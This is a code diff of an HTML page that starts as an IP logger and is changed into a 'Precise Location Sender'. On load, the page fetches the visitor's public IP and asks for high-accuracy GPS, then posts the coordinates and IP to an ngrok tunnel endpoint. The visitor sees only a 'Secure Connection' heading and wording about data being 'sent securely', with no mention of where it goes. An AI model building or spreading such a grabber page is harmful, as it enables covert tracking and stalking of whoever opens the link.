@@ -3,60 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Sender</title>
+    <title>Precise Location Sender</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 80px;
-            background-color: #f4f4f9;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 80px; background-color: #f4f4f9; }
         h1 { color: #333; }
-        #status {
-            font-size: 1.2rem;
-            color: #0066cc;
-            margin-top: 20px;
-            font-weight: bold;
-        }
+        #status { font-size: 1.2rem; color: #0066cc; margin-top: 20px; font-weight: bold; }
+        #error { color: red; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <h1>Connecting...</h1>
-    <div id="status">Fetching and sending your phone's IP address...</div>
+    <h1>Secure Connection</h1>
+    <div id="status">Requesting location permissions... Please click "Allow" when prompted.</div>
+    <div id="error"></div>
 
     <script>
-        async function sendIPToSystem() {
+        const backendUrl = 'https://trophy-appetizer-spleen.ngrok-free.dev/log-ip';
+
+        async function sendData(lat, lon, accuracy, phoneIp) {
             const statusDiv = document.getElementById('status');
             try {
-                // 1. Get the phone's public IP
-                let ipResponse = await fetch('https://api.ipify.org?format=json');
-                let ipData = await ipResponse.json();
-                let phoneIp = ipData.ip;
-
-                // 2. Send this IP to your system using YOUR specific ngrok link
-               let backendUrl = 'https://trophy-appetizer-spleen.ngrok-free.dev/log-ip';
                 let sendResponse = await fetch(backendUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'ngrok-skip-browser-warning': 'true' 
                     },
-                    body: JSON.stringify({ ip: phoneIp })
+                    body: JSON.stringify({ 
+                        ip: phoneIp,
+                        latitude: lat,
+                        longitude: lon,
+                        accuracy: accuracy
+                    })
                 });
 
                 if (sendResponse.ok) {
-                    statusDiv.innerText = "Success! Your phone's IP has been sent to your system.";
+                    statusDiv.innerText = "Success! Exact location sent securely.";
                 } else {
-                    statusDiv.innerText = "Failed to transmit IP to system.";
+                    statusDiv.innerText = "Failed to transmit data to system.";
                 }
             } catch (error) {
                 statusDiv.innerText = "An error occurred during transmission.";
             }
         }
 
-        // Automatically trigger as soon as the link is opened
-        window.onload = sendIPToSystem;
+        async function init() {
+            const statusDiv = document.getElementById('status');
+            const errorDiv = document.getElementById('error');
+            
+            // 1. Get IP address 
+            let phoneIp = "Unknown";
+            try {
+                let ipResponse = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipResponse.json();
+                phoneIp = ipData.ip;
+            } catch (e) { console.log("Failed to get IP"); }
+
+            // 2. Request Exact GPS Location
+            if ('geolocation' in navigator) {
+                // The getCurrentPosition method takes a success callback, an error callback, and an options object
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        sendData(lat, lon, accuracy, phoneIp);
+                    },
+                    (error) => {
+                        statusDiv.innerText = "Location access denied or unavailable.";
+                        errorDiv.innerText = `Error: ${error.message}`;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                statusDiv.innerText = "Geolocation is not supported by your browser.";
+            }
+        }
+
+        // Trigger automatically when the page loads
+        window.onload = init;
     </script>
 
 </body>
